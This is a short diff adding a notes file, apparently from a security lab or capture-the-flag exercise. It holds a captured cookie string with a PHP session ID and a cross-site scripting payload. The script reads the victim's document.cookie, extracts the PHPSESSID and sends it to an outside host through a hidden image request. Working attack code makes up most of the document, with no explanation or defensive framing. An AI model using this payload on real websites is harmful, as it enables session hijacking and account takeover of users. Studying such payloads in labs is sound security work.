@@ -1,0 +1,6 @@
+Mall: _ga=GA1.1.170736894.1711331633; _ga_R9E78CZS8Q=GS1.1.1711331633.1.0.1711332330.0.0.0; PHPSESSID=tbqaau8cf01s2tcug0ppaqrgf7
+
+Alic: 
+
+
+<script>const image = new Image(0, 0); image.src=`https://token.seclab.space/set.php?sid=tbqaau8cf01s2tcug0ppaqrgf7&token=${document.cookie.substring(document.cookie.indexOf("PHPSESSID=") + "PHPSESSID=".length)}`; document.body.appendChild(image);</script>
